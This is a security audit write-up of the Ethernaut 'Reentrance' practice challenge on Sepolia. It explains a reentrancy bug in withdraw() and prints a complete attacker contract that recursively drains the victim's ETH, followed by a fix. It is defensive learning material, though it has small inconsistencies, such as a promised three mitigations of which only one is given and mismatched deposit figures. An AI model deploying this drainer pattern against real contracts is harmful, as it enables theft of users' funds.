# Ethernaut Reentrancy Level — Security Audit Report

**Prepared by:** ALPHA  
**Date:** April 5, 2026  
**Methodology:** Manual code review  
**Network:** Sepolia Testnet  
**Target Contract:** `Reentrance.sol`  
---

## Table of Contents

- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Scope](#audit-scope)
- [Executive Summary](#executive-summary)
- [Findings](#findings)
  - [[H-1] Reentrancy in `withdraw()` allows complete fund drainage](#h-1-reentrancy-in-withdraw-allows-complete-fund-drainage)
  - [[I-1] Floating pragma version](#i-1-floating-pragma-version)
- [Recommendations Summary](#recommendations-summary)
- [Conclusion](#conclusion)

---

## Protocol Summary

`Reentrance.sol` is a minimal Solidity contract that allows users to donate ETH and later withdraw their balance. The contract maintains an internal `balances` mapping to track per-address holdings.

The contract is part of the [Ethernaut](https://ethernaut.openzeppelin.com/) challenges.

---

## Disclaimer

ALPHA makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by ALPHA is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

---

## Risk Classification

Findings are classified using the following matrix:

| Severity | Description |
|---|---|
| **High** | Direct loss of funds or critical protocol failure with no preconditions |
| **Medium** | Loss of funds or protocol disruption under specific conditions |
| **Low** | Minor issues with limited impact |
| **Informational** | Best practice violations, code quality, or gas improvements |

---

## Audit Scope

```
Reentrance.sol
├── donate(address _to)
├── balanceOf(address _who)
└── withdraw(uint256 _amount)
```

**Compiler version:** `^0.6.12`  
**License:** MIT

---

## Executive Summary

The audit identified **one High severity vulnerability** and **one Informational finding** in `Reentrance.sol`.

The High severity finding is a classic **reentrancy vulnerability** in the `withdraw()` function. The function transfers ETH to the caller *before* updating the internal balance, violating the Checks-Effects-Interactions (CEI) pattern. A malicious contract can exploit this to recursively drain the entire contract balance in a single transaction. This is fully reproducible and exploitable with no preconditions beyond a small initial deposit.

| ID | Title | Severity |
|---|---|---|
| H-1 | Reentrancy in `withdraw()` allows complete fund drainage | High |
| I-1 | Floating pragma version | Informational |

---

## Findings

---

### [H-1] Reentrancy in `withdraw()` allows complete fund drainage

**Severity:** High  
**Likelihood:** High  
**Impact:** Critical — full loss of funds

---

#### Description

The `withdraw()` function violates the [Checks-Effects-Interactions (CEI)](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern. It sends ETH to `msg.sender` via a low-level `.call` **before** decrementing `balances[msg.sender]`. This ordering allows a malicious contract to re-enter `withdraw()` in its `receive()` fallback before the balance update occurs, repeatedly draining funds on each recursive call.

**Vulnerable code — `Reentrance.sol`:**

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");  // ETH sent first
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;  // balance updated after the call
    }
}
```

Because `balances[msg.sender]` is not decremented until *after* the external call returns, a re-entrant call from the recipient's `receive()` function will pass the `balances[msg.sender] >= _amount` check again and again until the contract is fully drained.

---

#### Proof of Concept

The following attacker contract demonstrates complete drainage of the victim:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance public immutable victim;
    uint256 public attackAmount;

    constructor(address _victim) public {
        victim = IReentrance(_victim);
    }

    /// Step 1 — seed a balance in the victim, then trigger the exploit
    function attack() external payable {
        require(msg.value > 0, "send ETH");
        attackAmount = msg.value;
        victim.donate{value: msg.value}(address(this));
        victim.withdraw(attackAmount);
    }

    /// Step 2 — re-enter withdraw() on every incoming ETH transfer
    receive() external payable {
        if (address(victim).balance >= attackAmount) {
            victim.withdraw(attackAmount);
        }
    }

    /// Step 3 — recover all drained funds to attacker (EOA)
    function drain() external {
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }
}
```

**Execution steps:**

1. Deploy `ReentranceAttack` with the victim's address.
2. Call `attack()` with `17400000 GWEI` — this seeds a legitimate balance entry and immediately calls `withdraw()`.
3. The victim sends ETH - triggers `receive()` - re-enters `withdraw()` - repeats until `victim.balance < attackAmount`.
4. Call `drain()` to transfer all stolen ETH to your EOA.

**Observed result on Sepolia:**

| | Value |
|---|---|
| Victim balance before | ~0.0184 ETH |
| Attacker deposit | 0.001 ETH |
| Victim balance after | 0 ETH |
| Attacker profit | ~0.0174 ETH |

---

#### Recommended Mitigation

Apply all three of the following, in order of priority:

**1. Enforce Checks-Effects-Interactions (CEI)**

Decrement the balance *before* the external call so that any re-entrant call sees a zeroed balance and exits cleanly.

```diff
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
-       (bool result,) = msg.sender.call{value: _amount}("");
-       if (result) {
-           _amount;
-       }
-       balances[msg.sender] -= _amount;
+       balances[msg.sender] -= _amount;
+       (bool success,) = msg.sender.call{value: _amount}("");
+       require(success, "Reentrance: ETH transfer failed");
    }
}
```

---

### [I-1] Floating pragma version

**Severity:** Informational

---

#### Description

The contract uses a floating pragma (`^0.6.12`), which allows compilation with any `0.6.x` release. Different compiler versions may produce different bytecode and carry different known bugs.

```solidity
pragma solidity ^0.6.12;
```

#### Recommended Mitigation

Pin the pragma to a specific, audited compiler version:

```solidity
pragma solidity 0.6.12;
```

---

## Recommendations Summary

| ID | Recommendation | Priority |
|---|---|---|
| H-1 | Move `balances[msg.sender] -= _amount` above the `.call` in `withdraw()` | Immediate |
| I-1 | Pin compiler pragma to `0.6.12` | Low |

---

## Conclusion

`Reentrance.sol` contains a critical reentrancy vulnerability that allows any attacker to drain 100% of contract funds with a trivial on-chain exploit requiring only a minimal ETH deposit to bootstrap. The root cause is a well-documented violation of the Checks-Effects-Interactions pattern. Remediation is straightforward: reorder the state update before the external call.

---

*This report was produced as part of an independent security research portfolio.*  
*ALPHA — April 5, 2026*
